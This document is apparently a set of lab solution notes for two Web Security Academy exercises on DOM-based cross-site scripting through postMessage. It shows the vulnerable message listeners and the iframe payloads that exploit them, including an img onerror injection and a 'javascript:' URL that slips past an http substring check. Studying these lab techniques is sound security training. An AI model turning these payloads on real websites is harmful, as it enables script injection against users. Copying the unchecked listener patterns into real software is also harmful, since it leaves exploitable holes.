## DOM XSS using web messages
We see in the webpage javascript there is the following event listener:
```
<script>
                        window.addEventListener('message', function(e) {
                            document.getElementById('ads').innerHTML = e.data;
                        })
</script>
```

Staging the payload in the exploit server. 
```
<iframe src="https://0ae4003904d6f1f482f4e23200d20060.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print() >', '*')" >
```

## DOM XSS using web messages and a javascript URL
The page contains a sink in the form of a message event listener:
```
<script>
    window.addEventListener('message', function(e) {
        var url = e.data;
        if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
            location.href = url;
        }
    }, false);
</script>              
```
Stage an exploit on a page that the user visits.
The iframe loads the target site and calls contextWindow.postMessage to trigger the event listener.
The message includes javascript for any (*) target origin
```
<iframe src="https://0a27003803718cf18050940e007f00d6.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```